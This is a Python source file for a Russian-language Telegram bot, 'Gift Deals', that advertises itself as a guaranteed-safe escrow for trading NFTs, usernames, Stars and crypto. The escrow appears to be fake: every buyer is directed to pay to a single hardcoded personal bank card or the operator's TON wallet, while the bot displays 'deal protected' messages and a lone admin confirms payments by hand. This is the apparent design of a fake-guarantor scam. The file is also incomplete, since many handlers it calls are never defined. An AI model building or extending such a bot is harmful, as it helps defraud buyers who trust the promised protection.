import logging
import json
import os
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ===================== CONFIG =====================
BOT_TOKEN = "ВСТАВЬТЕ_ТОКЕН_СЮДА"
ADMIN_ID = 174415647
BOT_USERNAME = "GiftDealsRoBot"
MANAGER_USERNAME = "@GiftDealsManager"
CRYPTO_ADDRESS = "UQDUUFncBcWC4eH3wN_4G3N9Yaf6nBFlcumDP8daYAQHNSOc"
CRYPTO_BOT_LINK = "https://t.me/send?start=IVtoVqCXSHV0"
DB_FILE = "db.json"

# ===================== ANIMATED EMOJI =====================
def ae(eid, fallback):
    return f"<tg-emoji emoji-id='{eid}'>{fallback}</tg-emoji>"

E = {
    "diamond":   ae("5447644880824181073", "💎"),
    "check":     ae("5445284367535759945", "✅"),
    "cross":     ae("5447354187759300341", "❌"),
    "fire":      ae("5422998492250386138", "🔥"),
    "star":      ae("5368324170671202286", "⭐"),
    "lock":      ae("5472354553527541051", "🔒"),
    "bell":      ae("5383165799791730254", "🔔"),
    "gift":      ae("5373026167722876724", "🎁"),
    "trophy":    ae("5373165539476767939", "🏆"),
    "shield":    ae("5472354553527541051", "🛡"),
    "money":     ae("5451882697270755274", "💰"),
    "pencil":    ae("5431815452437257407", "✏️"),
    "globe":     ae("5440539497383087970", "🌍"),
    "nft":       ae("5409081890498491521", "🖼"),
    "user":      ae("5440539497383087970", "👤"),
    "premium":   ae("5383165799791730254", "✈️"),
    "deal":      ae("5267021122383086560", "🤝"),
    "hourglass": ae("5451882697270755274", "⏳"),
    "card":      ae("5368324170671202286", "💳"),
}

# ===================== DATABASE =====================
def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {
        "users": {}, "deals": {}, "banner": None,
        "banner_photo": None, "banner_video": None,
        "menu_description": None, "deal_counter": 1
    }

def save_db(db):
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(db, f, ensure_ascii=False, indent=2)

def get_user(db, user_id):
    uid = str(user_id)
    if uid not in db["users"]:
        db["users"][uid] = {
            "username": "", "balance": 0, "total_deals": 0,
            "success_deals": 0, "turnover": 0, "reputation": 0,
            "reviews": [], "status": "", "lang": "ru"
        }
    return db["users"][uid]

def get_lang(update):
    db = load_db()
    return get_user(db, update.effective_user.id).get("lang", "ru")

def gen_deal_id(db):
    did = db.get("deal_counter", 1)
    db["deal_counter"] = did + 1
    save_db(db)
    return f"GD{did:05d}"

# ===================== LOCALIZATION =====================
LANGS = {
    "ru": "🇷🇺 Россия",      "en": "🇬🇧 English",
    "kz": "🇰🇿 Қазақстан",  "az": "🇦🇿 Azərbaycan",
    "uz": "🇺🇿 O'zbekiston", "kg": "🇰🇬 Кыргызстан",
    "tj": "🇹🇯 Тоҷикистон",  "by": "🇧🇾 Беларусь",
    "am": "🇦🇲 Հայاստан",   "ge": "🇬🇪 საქართველო",
    "ua": "🇺🇦 Україна",     "md": "🇲🇩 Moldova",
}

WELCOME_TEXT = {
    "ru": "Gift Deals — безопасная площадка для сделок в Telegram.\n\nГарантируем честность каждой транзакции.",
    "en": "Gift Deals — safe platform for deals in Telegram.\n\nWe guarantee honest transactions.",
    "kz": "Gift Deals — Telegram-дағы қауіпсіз мәміле алаңы.",
    "az": "Gift Deals — Telegram-da etibarlı əməliyyat platforması.",
    "uz": "Gift Deals — Telegram'dagi ishonchli bitim platformasi.",
    "kg": "Gift Deals — Telegram'дагы коопсуз бүтүм аянтчасы.",
    "tj": "Gift Deals — майдончаи боэтимоди муомилот дар Telegram.",
    "by": "Gift Deals — надзейная пляцоўка для здзелак у Telegram.",
    "am": "Gift Deals — Telegram-ի հուսալի գործարքային հարթակ:",
    "ge": "Gift Deals — Telegram-ის სანდო გარიგების პლატფორმა.",
    "ua": "Gift Deals — надійна платформа для угод у Telegram.",
    "md": "Gift Deals — platformă de încredere pentru tranzacții în Telegram.",
}

BTN = {
    "ru": {"deal":"✏️ Создать сделку","support":"🆘 Поддержка","balance":"➕ Пополнить","lang":"🌍 Язык","profile":"👤 Профиль","top":"🏆 Топ"},
    "en": {"deal":"✏️ Create Deal","support":"🆘 Support","balance":"➕ Top Up","lang":"🌍 Language","profile":"👤 Profile","top":"🏆 Top"},
    "kz": {"deal":"✏️ Мәміле","support":"🆘 Қолдау","balance":"➕ Баланс","lang":"🌍 Тіл","profile":"👤 Профиль","top":"🏆 Топ"},
    "az": {"deal":"✏️ Müqavilə","support":"🆘 Dəstək","balance":"➕ Balans","lang":"🌍 Dil","profile":"👤 Profil","top":"🏆 Top"},
    "uz": {"deal":"✏️ Bitim","support":"🆘 Qo'llab","balance":"➕ Balans","lang":"🌍 Til","profile":"👤 Profil","top":"🏆 Top"},
    "kg": {"deal":"✏️ Бүтүм","support":"🆘 Колдоо","balance":"➕ Баланс","lang":"🌍 Тил","profile":"👤 Профиль","top":"🏆 Топ"},
    "tj": {"deal":"✏️ Муомила","support":"🆘 Дастгирӣ","balance":"➕ Баланс","lang":"🌍 Забон","profile":"👤 Профил","top":"🏆 Топ"},
    "by": {"deal":"✏️ Здзелка","support":"🆘 Падтрымка","balance":"➕ Баланс","lang":"🌍 Мова","profile":"👤 Профіль","top":"🏆 Топ"},
    "am": {"deal":"✏️ Գործարք","support":"🆘 Օգնություն","balance":"➕ Հաշիվ","lang":"🌍 Լեզու","profile":"👤 Պրոֆիլ","top":"🏆 Լավագույն"},
    "ge": {"deal":"✏️ გარიგება","support":"🆘 მხარდაჭ.","balance":"➕ ბალანსი","lang":"🌍 ენა","profile":"👤 პროფილი","top":"🏆 საუკეთ."},
    "ua": {"deal":"✏️ Угода","support":"🆘 Підтримка","balance":"➕ Поповнити","lang":"🌍 Мова","profile":"👤 Профіль","top":"🏆 Топ"},
    "md": {"deal":"✏️ Tranzacție","support":"🆘 Suport","balance":"➕ Sold","lang":"🌍 Limbă","profile":"👤 Profil","top":"🏆 Top"},
}

# Currency names per language
CUR_NAMES = {
    "TON":   "💎 TON",
    "USDT":  "💵 USDT",
    "Stars": {"ru":"⭐️ Звёзды","en":"⭐️ Stars","kz":"⭐️ Жұлдыздар","az":"⭐️ Ulduzlar","uz":"⭐️ Yulduzlar","kg":"⭐️ Жылдыздар","tj":"⭐️ Ситораҳо","by":"⭐️ Зоркі","am":"⭐️ Աստղեր","ge":"⭐️ ვარსკვლავები","ua":"⭐️ Зірки","md":"⭐️ Stele"},
    "RUB":   {"ru":"🇷🇺 Рубли","en":"🇷🇺 RUB","kz":"🇷🇺 Рубль","az":"🇷🇺 Rubl","uz":"🇷🇺 Rubl","kg":"🇷🇺 Рубль","tj":"🇷🇺 Рубл","by":"🇷🇺 Рублі","am":"🇷🇺 Ռուբlի","ge":"🇷🇺 რუბლი","ua":"🇷🇺 Рублі","md":"🇷🇺 Ruble"},
    "KZT":   {"ru":"🇰🇿 Тенге","en":"🇰🇿 Tenge","kz":"🇰🇿 Теңге","az":"🇰🇿 Tenge","uz":"🇰🇿 Tenge","kg":"🇰🇿 Теңге","tj":"🇰🇿 Тенге","by":"🇰🇿 Тэнге","am":"🇰🇿 Տengе","ge":"🇰🇿 ტengе","ua":"🇰🇿 Тенге","md":"🇰🇿 Tenge"},
    "AZN":   {"ru":"🇦🇿 Манаты","en":"🇦🇿 Manat","kz":"🇦🇿 Манат","az":"🇦🇿 Manat","uz":"🇦🇿 Manat","kg":"🇦🇿 Манат","tj":"🇦🇿 Манат","by":"🇦🇿 Манаты","am":"🇦🇿 Mанaт","ge":"🇦🇿 მანათი","ua":"🇦🇿 Манати","md":"🇦🇿 Manat"},
    "KGS":   {"ru":"🇰🇬 Сомы","en":"🇰🇬 Som","kz":"🇰🇬 Сом","az":"🇰🇬 Som","uz":"🇰🇬 Som","kg":"🇰🇬 Сом","tj":"🇰🇬 Сом","by":"🇰🇬 Сомы","am":"🇰🇬 Сом","ge":"🇰🇬 სომი","ua":"🇰🇬 Соми","md":"🇰🇬 Som"},
    "UZS":   {"ru":"🇺🇿 Сумы","en":"🇺🇿 Sum","kz":"🇺🇿 Сум","az":"🇺🇿 Sum","uz":"🇺🇿 So'm","kg":"🇺🇿 Сум","tj":"🇺🇿 Сум","by":"🇺🇿 Сумы","am":"🇺🇿 Сум","ge":"🇺🇿 სუმი","ua":"🇺🇿 Суми","md":"🇺🇿 Sum"},
    "TJS":   {"ru":"🇹🇯 Сомони","en":"🇹🇯 Somoni","kz":"🇹🇯 Сомонӣ","az":"🇹🇯 Somoni","uz":"🇹🇯 Somoni","kg":"🇹🇯 Сомонӣ","tj":"🇹🇯 Сомонӣ","by":"🇹🇯 Самані","am":"🇹🇯 Сомони","ge":"🇹🇯 სომони","ua":"🇹🇯 Сомоні","md":"🇹🇯 Somoni"},
    "BYN":   {"ru":"🇧🇾 Рубли BY","en":"🇧🇾 BYN","kz":"🇧🇾 Рубль BY","az":"🇧🇾 Rubl BY","uz":"🇧🇾 Rubl BY","kg":"🇧🇾 Рубль BY","tj":"🇧🇾 Рубл BY","by":"🇧🇾 Рублі","am":"🇧🇾 Ռуб. BY","ge":"🇧🇾 რუბ. BY","ua":"🇧🇾 Рублі BY","md":"🇧🇾 Ruble BY"},
    "UAH":   {"ru":"🇺🇦 Гривны","en":"🇺🇦 Hryvnia","kz":"🇺🇦 Гривна","az":"🇺🇦 Qrivna","uz":"🇺🇦 Grivna","kg":"🇺🇦 Гривна","tj":"🇺🇦 Гривна","by":"🇺🇦 Грыўні","am":"🇺🇦 Гривна","ge":"🇺🇦 გრივნა","ua":"🇺🇦 Гривні","md":"🇺🇦 Grivne"},
    "GEL":   {"ru":"🇬🇪 Лари","en":"🇬🇪 Lari","kz":"🇬🇪 Лари","az":"🇬🇪 Lari","uz":"🇬🇪 Lari","kg":"🇬🇪 Лари","tj":"🇬🇪 Лари","by":"🇬🇪 Лары","am":"🇬🇪 Լари","ge":"🇬🇪 ლარი","ua":"🇬🇪 Ларі","md":"🇬🇪 Lari"},
}

CURRENCY_MAP = {
    "cur_ton":"TON","cur_usdt":"USDT","cur_rub":"RUB","cur_stars":"Stars",
    "cur_kzt":"KZT","cur_azn":"AZN","cur_kgs":"KGS","cur_uzs":"UZS",
    "cur_tjs":"TJS","cur_byn":"BYN","cur_uah":"UAH","cur_gel":"GEL",
}

def cur_name(code, lang):
    val = CUR_NAMES.get(code, code)
    if isinstance(val, dict):
        return val.get(lang, val.get("ru", code))
    return val

def currency_keyboard(lang="ru"):
    def n(c): return cur_name(c, lang)
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(n("TON"),   callback_data="cur_ton"),
         InlineKeyboardButton(n("USDT"),  callback_data="cur_usdt")],
        [InlineKeyboardButton(n("RUB"),   callback_data="cur_rub"),
         InlineKeyboardButton(n("Stars"), callback_data="cur_stars")],
        [InlineKeyboardButton(n("KZT"),   callback_data="cur_kzt"),
         InlineKeyboardButton(n("AZN"),   callback_data="cur_azn")],
        [InlineKeyboardButton(n("KGS"),   callback_data="cur_kgs"),
         InlineKeyboardButton(n("UZS"),   callback_data="cur_uzs")],
        [InlineKeyboardButton(n("TJS"),   callback_data="cur_tjs"),
         InlineKeyboardButton(n("BYN"),   callback_data="cur_byn")],
        [InlineKeyboardButton(n("UAH"),   callback_data="cur_uah"),
         InlineKeyboardButton(n("GEL"),   callback_data="cur_gel")],
    ])

# ===================== STATE MACHINE =====================
# States stored in context.user_data["step"]
STEP_PARTNER   = "partner"
STEP_NFT_LINK  = "nft_link"
STEP_USERNAME  = "trade_username"
STEP_STARS     = "stars_count"
STEP_AMOUNT    = "amount"
STEP_PREM_CUR  = "prem_cur"

# ===================== MENU =====================
def main_menu_kb(lang="ru"):
    b = BTN.get(lang, BTN["ru"])
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(b["deal"], callback_data="menu_deal")],
        [InlineKeyboardButton(b["support"], url="https://t.me/GiftDealsSupport"),
         InlineKeyboardButton(b["balance"], callback_data="menu_balance")],
        [InlineKeyboardButton(b["lang"], callback_data="menu_lang"),
         InlineKeyboardButton(b["profile"], callback_data="menu_profile")],
        [InlineKeyboardButton(b["top"], callback_data="menu_top")],
    ])

async def send_main_menu(update, context, edit=False):
    db = load_db()
    uid = update.effective_user.id
    u = get_user(db, uid)
    lang = u.get("lang", "ru")
    desc = db.get("menu_description") or WELCOME_TEXT.get(lang, WELCOME_TEXT["ru"])
    banner = db.get("banner") or ""
    text = f"{E['diamond']} <b>Gift Deals\n\n{desc}</b>"
    if banner:
        text += f"\n\n<b>{banner}</b>"
    kb = main_menu_kb(lang)
    bv = db.get("banner_video")
    bp = db.get("banner_photo")
    if bv:
        await update.effective_message.reply_video(video=bv, caption=text, parse_mode="HTML", reply_markup=kb)
    elif bp:
        await update.effective_message.reply_photo(photo=bp, caption=text, parse_mode="HTML", reply_markup=kb)
    elif edit:
        try:
            await update.callback_query.edit_message_text(text, parse_mode="HTML", reply_markup=kb)
        except Exception:
            await update.effective_message.reply_text(text, parse_mode="HTML", reply_markup=kb)
    else:
        await update.effective_message.reply_text(text, parse_mode="HTML", reply_markup=kb)

# ===================== START =====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    db = load_db()
    user = update.effective_user
    u = get_user(db, user.id)
    u["username"] = user.username or ""
    save_db(db)
    context.user_data.clear()
    args = context.args
    if args and args[0].startswith("deal_"):
        deal_id = args[0][5:].upper()
        deals = db.get("deals", {})
        if deal_id in deals:
            await send_deal_card(update, context, deal_id, deals[deal_id], is_buyer=True)
            return
        await update.effective_message.reply_text(f"<b>Сделка {deal_id} не найдена.</b>", parse_mode="HTML")
    await send_main_menu(update, context)

# ===================== DEAL TYPES MENU =====================
async def show_deal_types(update, context):
    lang = get_lang(update)
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🖼 НФТ", callback_data="deal_nft"),
         InlineKeyboardButton("👤 Юзернейм", callback_data="deal_username")],
        [InlineKeyboardButton("⭐️ Звёзды", callback_data="deal_stars"),
         InlineKeyboardButton("💎 Крипта", callback_data="deal_crypto")],
        [InlineKeyboardButton("✈️ Telegram Premium", callback_data="deal_premium")],
        [InlineKeyboardButton("◀️ Назад", callback_data="main_menu")],
    ])
    text = f"{E['pencil']} <b>Создать сделку\n\nВыберите тип:</b>"
    try:
        await update.callback_query.edit_message_text(text, parse_mode="HTML", reply_markup=kb)
    except Exception:
        await update.effective_message.reply_text(text, parse_mode="HTML", reply_markup=kb)

# ===================== ALL CALLBACKS =====================
async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    data = q.data
    ud = context.user_data
    lang = get_lang(update)

    # ── Main navigation ──────────────────────────────────
    if data == "main_menu":
        ud.clear()
        await send_main_menu(update, context, edit=True)
        return
    if data == "menu_deal":
        ud.clear()
        await show_deal_types(update, context)
        return
    if data == "menu_balance":
        await show_balance_menu(update, context)
        return
    if data == "menu_lang":
        await show_lang_menu(update, context)
        return
    if data == "menu_profile":
        await show_profile(update, context)
        return
    if data == "menu_top":
        await show_top_sellers(update, context)
        return
    if data.startswith("lang_"):
        await set_language(update, context, data[5:])
        return
    if data.startswith("balance_"):
        await show_balance_info(update, context, data[8:])
        return
    if data == "withdraw":
        await withdraw_handler(update, context)
        return
    if data.startswith("paid_"):
        await paid_callback(update, context)
        return
    if data == "noop":
        return
    if data.startswith("adm_confirm_"):
        await admin_confirm(update, context)
        return
    if data.startswith("adm_decline_"):
        await admin_decline(update, context)
        return

    # ── Deal type selection ───────────────────────────────
    if data == "deal_nft":
        ud.clear()
        ud["type"] = "nft"
        ud["step"] = STEP_PARTNER
        await q.edit_message_text(
            f"{E['nft']} <b>НФТ\n\nВведите @юзернейм партнёра:</b>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Назад", callback_data="menu_deal")]]))
        return

    if data == "deal_username":
        ud.clear()
        ud["type"] = "username"
        ud["step"] = STEP_PARTNER
        await q.edit_message_text(
            f"{E['user']} <b>Юзернейм\n\nВведите @юзернейм партнёра:</b>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Назад", callback_data="menu_deal")]]))
        return

    if data == "deal_stars":
        ud.clear()
        ud["type"] = "stars"
        ud["step"] = STEP_PARTNER
        await q.edit_message_text(
            f"{E['star']} <b>Звёзды\n\nВведите @юзернейм партнёра:</b>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Назад", callback_data="menu_deal")]]))
        return

    if data == "deal_crypto":
        ud.clear()
        ud["type"] = "crypto"
        ud["partner"] = "—"
        await q.edit_message_text(
            f"{E['diamond']} <b>Крипта\n\nВыберите валюту:</b>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💎 TON", callback_data="crypto_ton"),
                 InlineKeyboardButton("💵 USDT", callback_data="crypto_usdt")],
                [InlineKeyboardButton("◀️ Назад", callback_data="menu_deal")],
            ]))
        return

    if data == "deal_premium":
        ud.clear()
        ud["type"] = "premium"
        ud["step"] = STEP_PARTNER
        await q.edit_message_text(
            f"{E['premium']} <b>Telegram Premium\n\nВведите @юзернейм партнёра:</b>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Назад", callback_data="menu_deal")]]))
        return

    # ── Crypto currency ───────────────────────────────────
    if data in ("crypto_ton", "crypto_usdt"):
        ud["currency"] = "TON" if data == "crypto_ton" else "USDT"
        ud["step"] = STEP_AMOUNT
        await q.edit_message_text(
            f"{E['diamond']} <b>Крипта ({ud['currency']})\n\nВведите сумму сделки:</b>",
            parse_mode="HTML")
        return

    # ── Premium period ────────────────────────────────────
    if data in ("prem_3", "prem_6", "prem_12"):
        periods = {"prem_3": "3 месяца", "prem_6": "6 месяцев", "prem_12": "12 месяцев"}
        ud["premium_period"] = periods[data]
        ud["step"] = "prem_currency"
        await q.edit_message_text(
            f"{E['premium']} <b>Telegram Premium\n\nВыберите валюту:</b>",
            parse_mode="HTML", reply_markup=currency_keyboard(lang))
        return

    # ── Currency selection ────────────────────────────────
    if data.startswith("cur_"):
        currency = CURRENCY_MAP.get(data, data)
        ud["currency"] = currency
        ud["step"] = STEP_AMOUNT
        dtype = ud.get("type", "")
        icons = {"nft": E['nft'], "username": E['user'], "stars": E['star'], "premium": E['premium']}
        icon = icons.get(dtype, E['deal'])
        await q.edit_message_text(
            f"{icon} <b>Введите сумму сделки:</b>",
            parse_mode="HTML")
        return

    # ── Admin callbacks ───────────────────────────────────
    if data == "adm_back":
        await q.edit_message_text(
            f"{E['shield']} <b>Панель администратора</b>",
            parse_mode="HTML", reply_markup=admin_main_kb())
        return
    if data.startswith("adm_"):
        await handle_admin_callback(update, context)
        return

# ===================== ALL MESSAGES =====================
async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ud = context.user_data
    lang = get_lang(update)
    text = update.message.text.strip()
    dtype = ud.get("type")
    step = ud.get("step")

    # No active deal flow
    if not dtype or not step:
        return

    # ── Waiting for partner username ──────────────────────
    if step == STEP_PARTNER:
        if not text.startswith("@"):
            await update.message.reply_text(
                f"{E['cross']} <b>Юзернейм должен начинаться с @\nПопробуйте снова:</b>",
                parse_mode="HTML")
            return
        ud["partner"] = text

        if dtype == "nft":
            ud["step"] = STEP_NFT_LINK
            await update.message.reply_text(
                f"{E['nft']} <b>НФТ\n\nВставьте ссылку (https://...):</b>",
                parse_mode="HTML")
        elif dtype == "username":
            ud["step"] = STEP_USERNAME
            await update.message.reply_text(
                f"{E['user']} <b>Юзернейм\n\nВведите @юзернейм товара:</b>",
                parse_mode="HTML")
        elif dtype == "stars":
            ud["step"] = STEP_STARS
            await update.message.reply_text(
                f"{E['star']} <b>Звёзды\n\nСколько звёзд?</b>",
                parse_mode="HTML")
        elif dtype == "premium":
            ud["step"] = "prem_period"
            await update.message.reply_text(
                f"{E['premium']} <b>Telegram Premium\n\nВыберите срок:</b>",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("3 месяца", callback_data="prem_3"),
                     InlineKeyboardButton("6 месяцев", callback_data="prem_6"),
                     InlineKeyboardButton("12 месяцев", callback_data="prem_12")],
                ]))
        return

    # ── NFT link ──────────────────────────────────────────
    if step == STEP_NFT_LINK:
        if not text.startswith("https://"):
            await update.message.reply_text(
                f"{E['cross']} <b>Ссылка должна начинаться с https://</b>",
                parse_mode="HTML")
            return
        ud["nft_link"] = text
        ud["step"] = "currency"
        await update.message.reply_text(
            f"{E['nft']} <b>НФТ\n\nВыберите валюту:</b>",
            parse_mode="HTML", reply_markup=currency_keyboard(lang))
        return

    # ── Username input ────────────────────────────────────
    if step == STEP_USERNAME:
        if not text.startswith("@"):
            await update.message.reply_text(
                f"{E['cross']} <b>Юзернейм должен начинаться с @</b>",
                parse_mode="HTML")
            return
        ud["trade_username"] = text
        ud["step"] = "currency"
        await update.message.reply_text(
            f"{E['user']} <b>Юзернейм\n\nВыберите валюту:</b>",
            parse_mode="HTML", reply_markup=currency_keyboard(lang))
        return

    # ── Stars count ───────────────────────────────────────
    if step == STEP_STARS:
        if not text.isdigit():
            await update.message.reply_text(
                f"{E['cross']} <b>Только цифры!</b>",
                parse_mode="HTML")
            return
        ud["stars_count"] = text
        ud["step"] = "currency"
        await update.message.reply_text(
            f"{E['star']} <b>Звёзды\n\nВыберите валюту:</b>",
            parse_mode="HTML", reply_markup=currency_keyboard(lang))
        return

    # ── Amount ────────────────────────────────────────────
    if step == STEP_AMOUNT:
        ud["amount"] = text
        await finalize_deal(update, context)
        return

# ===================== FINALIZE DEAL =====================
async def finalize_deal(update, context):
    db = load_db()
    ud = context.user_data
    deal_id = gen_deal_id(db)
    dtype = ud.get("type", "unknown")
    partner = ud.get("partner", "—")
    currency = ud.get("currency", "—")
    amount = ud.get("amount", "—")
    user = update.effective_user

    db["deals"][deal_id] = {
        "user_id": str(user.id), "type": dtype, "partner": partner,
        "currency": currency, "amount": amount, "status": "pending",
        "created": datetime.now().isoformat(), "data": dict(ud),
    }
    save_db(db)
    await send_deal_card(update, context, deal_id, db["deals"][deal_id], is_buyer=False)

    # Notify partner if they have started the bot
    p_uname = partner.lstrip("@").lower() if partner.startswith("@") else None
    if p_uname:
        p_uid = None
        for uid, u in db["users"].items():
            if u.get("username", "").lower() == p_uname:
                p_uid = uid
                break
        if p_uid:
            try:
                await context.bot.send_message(
                    chat_id=int(p_uid),
                    text=await build_buyer_text(deal_id, db["deals"][deal_id], f"@{user.username or str(user.id)}"),
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("✅ Я оплатил", callback_data=f"paid_{deal_id}")],
                        [InlineKeyboardButton("🏠 Главное меню", callback_data="main_menu")],
                    ]))
            except Exception:
                pass
    context.user_data.clear()

async def build_buyer_text(deal_id, d, seller_tag):
    dtype = d.get("type", "")
    currency = d.get("currency", "—")
    amount = d.get("amount", "—")
    partner = d.get("partner", "—")
    dd = d.get("data", {})
    type_labels = {"nft":"🖼 NFT","username":"👤 Юзернейм","stars":"⭐️ Звёзды","crypto":"💎 Крипта","premium":"✈️ Telegram Premium"}
    item = ""
    if dtype == "nft":      item = f"\n📎 Ссылка: {dd.get('nft_link','—')}"
    elif dtype == "username": item = f"\n📎 Юзернейм: {dd.get('trade_username','—')}"
    elif dtype == "stars":  item = f"\n📎 Звёзд: {dd.get('stars_count','—')}"
    elif dtype == "premium": item = f"\n📎 Срок: {dd.get('premium_period','—')}"
    pay = (
        f"\n━━━━━━━━━━━━━━━━━━━━\n"
        f"💰 Сумма: <b>{amount} {currency}</b>\n\n"
        f"💳 Карта ВТБ:\n<code>89041751408 ВТБ — Александр Ф.</code>\n\n"
        f"💎 TON кошелёк:\n<code>{CRYPTO_ADDRESS}</code>\n\n"
        f"✅ После перевода нажмите «Я оплатил»"
    )
    return (
        f"{E['deal']} <b>Сделка #{deal_id}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🛒 Вы <b>покупатель</b>\n"
        f"👤 Продавец: <b>{seller_tag}</b>\n"
        f"{item}\n"
        f"📌 Тип: <b>{type_labels.get(dtype, dtype)}</b>\n"
        f"{E['lock']} Сделка защищена Gift Deals\n"
        f"{pay}"
    )

async def send_deal_card(update, context, deal_id, d, is_buyer=False):
    dtype = d.get("type", "")
    currency = d.get("currency", "—")
    amount = d.get("amount", "—")
    partner = d.get("partner", "—")
    dd = d.get("data", {})
    seller_uid = d.get("user_id", "")
    type_labels = {"nft":"🖼 NFT","username":"👤 Юзернейм","stars":"⭐️ Звёзды","crypto":"💎 Крипта","premium":"✈️ Telegram Premium"}
    item = ""
    if dtype == "nft":       item = f"\n📎 Ссылка: {dd.get('nft_link','—')}"
    elif dtype == "username": item = f"\n📎 Юзернейм: {dd.get('trade_username','—')}"
    elif dtype == "stars":   item = f"\n📎 Звёзд: {dd.get('stars_count','—')}"
    elif dtype == "premium": item = f"\n📎 Срок: {dd.get('premium_period','—')}"
    pay = (
        f"\n━━━━━━━━━━━━━━━━━━━━\n"
        f"💰 Сумма: <b>{amount} {currency}</b>\n\n"
        f"💳 Карта ВТБ:\n<code>89041751408 ВТБ — Александр Ф.</code>\n\n"
        f"💎 TON кошелёк:\n<code>{CRYPTO_ADDRESS}</code>\n\n"
        f"✅ После перевода нажмите «Я оплатил»"
    )
    if is_buyer:
        text = (
            f"{E['deal']} <b>Сделка #{deal_id}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🛒 Вы <b>покупатель</b>\n"
            f"👤 Продавец: <b>{partner}</b>\n"
            f"{item}\n"
            f"📌 Тип: <b>{type_labels.get(dtype, dtype)}</b>\n"
            f"{E['lock']} Сделка защищена Gift Deals\n"
            f"{pay}"
        )
        pu = f"https://t.me/{partner.lstrip('@')}" if partner.startswith("@") else "https://t.me/GiftDealsManager"
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Я оплатил", callback_data=f"paid_{deal_id}")],
            [InlineKeyboardButton("💬 Написать продавцу", url=pu)],
            [InlineKeyboardButton("🏠 Главное меню", callback_data="main_menu")],
        ])
    else:
        text = (
            f"{E['check']} <b>Сделка создана #{deal_id}</b>\n\n"
            f"👤 Вы <b>продавец</b>\n"
            f"👤 Партнёр: <b>{partner}</b>\n"
            f"{item}\n"
            f"📌 Тип: <b>{type_labels.get(dtype, dtype)}</b>\n"
            f"💰 Сумма: <b>{amount} {currency}</b>\n\n"
            f"🔗 Ссылка для покупателя:\n"
            f"<code>https://t.me/{BOT_USERNAME}?start=deal_{deal_id}</code>\n\n"
            f"Отправьте ссылку партнёру."
        )
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Главное меню", callback_data="main_menu")]])
    await update.effective_message.reply_text(text, parse_mode="HTML", reply_markup=kb)

# ===================== PAID =====================
async def paid_callback(update, context):
    q = update.callback_query
    await q.answer("Уведомление отправлено!")
    deal_id = q.data[5:]
    buyer = update.effective_user
    buyer_tag = f"@{buyer.username}" if buyer.username else str(buyer.id)
    db = load_db()
    d = db.get("deals", {}).get(deal_id, {})
    amount = d.get("amount", "—")
    currency = d.get("currency", "—")
    dtype = d.get("type", "")
    type_labels = {"nft":"🖼 NFT","username":"👤 Юзернейм","stars":"⭐️ Звёзды","crypto":"💎 Крипта","premium":"✈️ Premium"}
    admin_text = (
        f"{E['bell']} <b>Покупатель нажал «Я оплатил»</b>\n\n"
        f"📄 Сделка: <code>{deal_id}</code>\n"
        f"👤 {buyer_tag} (<code>{buyer.id}</code>)\n"
        f"📌 {type_labels.get(dtype, dtype)}\n"
        f"💰 {amount} {currency}\n\nПроверьте поступление:"
    )
    kb = InlineKeyboardMarkup([[
        InlineKeyboardButton("✅ Пришла", callback_data=f"adm_confirm_{deal_id}"),
        InlineKeyboardButton("❌ Не пришла", callback_data=f"adm_decline_{deal_id}"),
    ]])
    try:
        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text, parse_mode="HTML", reply_markup=kb)
    except Exception:
        pass
    seller_uid = d.get("user_id")
    if seller_uid and seller_uid != str(buyer.id):
        try:
            await context.bot.send_message(
                chat_id=int(seller_uid),
                text=f"{E['bell']} <b>Покупатель сообщил об оплате!</b>\n📄 <code>{deal_id}</code>\n👤 {buyer_tag}\n💰 {amount} {currency}",
                parse_mode="HTML")
        except Exception:
            pass
    await q.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup([
        [InlineKeyboardButton("⏳ Ожидание...", callback_data="noop")],
        [InlineKeyboardButton("🏠 Главное меню", callback_data="main_menu")],
    ]))

async def admin_confirm(update, context):
    q = update.callback_query
    await q.answer("✅")
    if update.effective_user.id != ADMIN_ID:
        return
    deal_id = q.data[12:]
    db = load_db()
    if deal_id in db.get("deals", {}):
        db["deals"][deal_id]["status"] = "confirmed"
        s = db["deals"][deal_id].get("user_id")
        if s and s in db["users"]:
            db["users"][s]["success_deals"] = db["users"][s].get("success_deals", 0) + 1
            db["users"][s]["total_deals"] = db["users"][s].get("total_deals", 0) + 1
        save_db(db)
        d = db["deals"][deal_id]
        await q.edit_message_text(
            f"{E['check']} <b>Оплата подтверждена!</b>\n📄 <code>{deal_id}</code>\n💰 {d.get('amount')} {d.get('currency')}",
            parse_mode="HTML")
        if s:
            try:
                await context.bot.send_message(
                    chat_id=int(s),
                    text=f"{E['check']} <b>Оплата подтверждена!</b>\n📄 <code>{deal_id}</code>\n💰 {d.get('amount')} {d.get('currency')}\n\nСделка завершена!",
                    parse_mode="HTML")
            except Exception:
                pass

